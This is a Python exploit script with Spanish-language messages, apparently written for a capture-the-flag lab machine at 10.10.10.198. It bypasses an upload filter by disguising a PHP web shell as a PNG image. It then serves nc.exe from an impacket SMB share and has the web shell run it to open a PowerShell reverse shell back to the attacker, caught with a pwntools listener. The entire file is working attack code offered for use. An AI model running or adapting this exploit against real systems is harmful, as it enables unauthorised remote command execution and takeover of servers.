#!/usr/bin/python3

import requests, sys, urllib, re, subprocess, threading, signal
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
from pwn import *

def ctrl_c(sig,frame):
        print("\n\n[*] Cerrando el programa. Por favor espere...\n")
        subprocess.call('fuser -k 445/tcp > /dev/null 2>&1 2>/dev/null',shell=True)
        sys.exit(-1)

signal.signal(signal.SIGINT, ctrl_c)

def webshell():
    try:
        print("[+] Activando REVERSE SHELL... (esto puede demorar alrededor de 30 segundos, por favor sea paciente!)\n")
        WEB_SHELL = 'http://10.10.10.198:8080/upload/shell.php'
        getdir  = {'cmd': '\\\\10.10.14.30\\nc\\nc.exe 10.10.14.30 443 -e powershell'}
        s = requests.Session()
        r2 = s.get(WEB_SHELL, params=getdir, verify=False)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

if __name__ == "__main__":
    SERVER_URL = 'http://10.10.10.198:8080/'
    UPLOAD_DIR = 'upload.php?id=shell'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    print("[+] Creando una SHELL...")
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file': 
                  (
                    'kaio-ken.php.png', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["cmd"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    print("[+] SHELL CREADA! UBICACION: http://10.10.10.198:8080/upload/shell.php\n")
    subprocess.call('cp /usr/share/windows-resources/binaries/nc.exe .', shell=True)
    subprocess.call('impacket-smbserver nc . -smb2support > /dev/null 2>&1 &', shell=True)
    threading.Thread(target=webshell).start()
    shell = listen(443).wait_for_connection()
    shell.interactive()

    print("[*] SHELL TERMINADA! GRACIAS POR USAR NUESTRO PROGRAMA!")
    subprocess.call('fuser -k 445/tcp > /dev/null 2>&1 2>/dev/null',shell=True)
